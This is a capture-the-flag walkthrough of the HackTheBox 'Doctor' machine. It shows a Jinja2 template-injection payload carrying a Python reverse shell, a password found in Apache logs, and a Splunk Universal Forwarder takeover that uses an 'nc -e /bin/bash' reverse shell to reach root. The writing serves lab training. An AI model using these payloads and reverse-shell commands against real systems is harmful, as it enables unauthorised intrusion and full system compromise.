## Doctor | HackTheBox

### 1. Scan
```bash
kali@kali:~/Desktop/htb/doctor$ sudo nmap -A -p- -T4 10.10.10.209
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-06 05:29 EDT
Nmap scan report for 10-10-10-209.tpgi.com.au (10.10.10.209)
Host is up (0.32s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (90%), Linux 2.6.32 (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 - 3.1 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   334.88 ms 10.10.14.1
2   340.12 ms 10-10-10-209.tpgi.com.au (10.10.10.209)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 424.57 seconds
```
The machine is running SSH, a HTTP server on port 80, and a Splunk server on port 8089.

### 2. Look at the website
The webpage being hosted by the machine is a themed around a medical clinic. There is a contact e-mail with the domain doctors.htb. A lot of the text is placeholder, so special attention can be paid to anything that has been added in. Three doctors are listed:
- Jade Guzman
- Hannah Ford
- James Wilson  
Additionally, the blog shows comments being posted by an "admin" account. Aside from this, there is not much information to get from the site. I did run a dirbust:
```bash
kali@kali:~$ dirb http://10.10.10.209

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Oct  6 22:27:50 2020
URL_BASE: http://10.10.10.209/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.209/ ----
==> DIRECTORY: http://10.10.10.209/css/                                                                                                                                                                                                   
==> DIRECTORY: http://10.10.10.209/fonts/                                                                                                                                                                                                 
==> DIRECTORY: http://10.10.10.209/images/                                                                                                                                                                                                
+ http://10.10.10.209/index.html (CODE:200|SIZE:19848)                                                                                                                                                                                    
==> DIRECTORY: http://10.10.10.209/js/                                                                                                                                                                                                    
+ http://10.10.10.209/server-status (CODE:403|SIZE:277)                                                                                                                                                                                   
                                                                                                                                                                                                                                          
---- Entering directory: http://10.10.10.209/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                          
---- Entering directory: http://10.10.10.209/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                          
---- Entering directory: http://10.10.10.209/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                          
---- Entering directory: http://10.10.10.209/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)                                                                                                                                                                                          
                                                                                                                                                                                                                                           
-----------------                                                                                                                                                                                                                          
END_TIME: Tue Oct  6 22:56:34 2020                                                                                                                                                                                                         
DOWNLOADED: 4612 - FOUND: 2  
```
  
When visiting the server using the hostname, we get directed to a "Doctors Secure Messaging" login page. There is a link to register an account, and addionally a source code comment indicates there is also an archive page.
```html
<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
```
Accounts are created with a "time limit of 20 minutes". Accounts have the ability to create messages to be shared between doctors. The archive page remains blank no matter if I'm logged in or not. However, when viewing source it can be seen that the post is inserting HTML tags for each post that is created.
```html
<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	<item><title>test</title></item>

			</channel>
			<item><title>test2</title></item>

			</channel>
			<item><title>test33</title></item>

			</channel>
```
Depending on how this data is being inserted into the page, malicious code may be executed.
There is a defined process for checking for this type of vulnerability at: https://portswigger.net/web-security/server-side-template-injection. By following this process, the following things are noted:
- A title of `{{7*7}}` evaluated to 49.
- A tile of `{{7*'7'}}`  evaluated to 7777777.  
According to the reference this means that the template engine that is being used is most likely jinja2.

### 3. Get a shell
Using the following payload in the title field:
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.20\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
```
Post it, then reload the archive with a listener running to get the shell.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 9999                                                                                                                 

listening on [any] 9999 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.209] 59384
/bin/sh: 0: can't access tty; job control turned off
$ whoami
web
$ id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
```

### 4. Enumeration
From the home directory for this web user, there is a blog.sh script and a "blog" directory.
```bash
web@doctor:~$ cat blog.sh

#!/bin/bash
SECRET_KEY=1234 SQLALCHEMY_DATABASE_URI=sqlite://///home/web/blog/flaskblog/site.db /usr/bin/python3 /home/web/blog/run.py
```
Upon further inspection, this runs the blog application through which I was interacting with before.  
As I'm a member of the adm group, I can search within the system logs.
```bash
web@doctor:/var/log$ grep -Ri password
grep: boot.log.2: Permission denied
auth.log:Feb 15 05:56:23 doctor VGAuth[666]: vmtoolsd: Username and password successfully validated for 'root'.
...
syslog.1:Sep 28 14:59:58 doctor kernel: [    5.666833] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
syslog.1:Feb 15 05:56:10 doctor systemd[1]: Condition check resulted in Dispatch Password Requests to Console Directory Watch being skipped.
syslog.1:Feb 15 05:56:10 doctor systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.
syslog.1:Feb 15 05:56:10 doctor kernel: [    4.191189] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
grep: vmware-network.1.log: Permission denied
apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```
Grep is able to find a reset password request in an old apache backup with what appears to be a password. Checking /etc/passwd shows there is another user, shaun, with a shell and home folder.

### 5. Lateral movement
Switch to the Shaun user by attempting to use the password "Guitar123".
```bash
web@doctor:/home$ su - shaun
su - shaun
Password: Guitar123

shaun@doctor:~$
```

### 6. Enumeration from user
The user has no sudo perms. Checking out processes, the Splunk daemon is running on port 8090 as root. This is the port used by the Splunk Universal Forwarder.
```bash
...
dbus://
whoopsie    1012  0.0  0.3 326788 15460 ?        Ssl  05:56   0:00 /usr/bin/whoopsie -f
kernoops    1014  0.0  0.0  11240   448 ?        Ss   05:56   0:00 /usr/sbin/kerneloops --test
kernoops    1017  0.0  0.0  11240   448 ?        Ss   05:56   0:00 /usr/sbin/kerneloops
root        1144  0.1  2.1 259516 86368 ?        Sl   05:56   0:11 splunkd -p 8089 start
root        1348  0.0  0.2 260728  9756 ?        Ssl  06:04   0:00 /usr/lib/upower/upowerd
shaun       2257  0.0  0.2  18748 10008 ?        Ss   08:35   0:00 /lib/systemd/systemd --user
...
```

### 7. Get a root shell
References: 
- https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2
- https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
  
Airman in reference 1 describes how remote command execution in Splunk Universal Forwarder can occur if the password has been changed and is known to the attacker. An attacker can use the management port to deploy a malicious application and in doing so executes attacker-provided commands.  
The second reference is a non-destructive tool that was created to exploit this issue.
```bash
┌──(kali㉿kali)-[~/Desktop/SplunkWhisperer2/PySplunkWhisperer2]
└─$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.20 --username shaun --password Guitar123 --payload 'nc.traditional -e /bin/bash 10.10.14.20 9998'
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpfol0oaq_.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.20:8181/
10.10.10.209 - - [15/Feb/2021 03:27:00] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup
```
Get a root shell.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 9998
listening on [any] 9998 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.209] 60696

python3 -c "import pty; pty.spawn('/bin/bash');"
root@doctor:/# whoami
root
```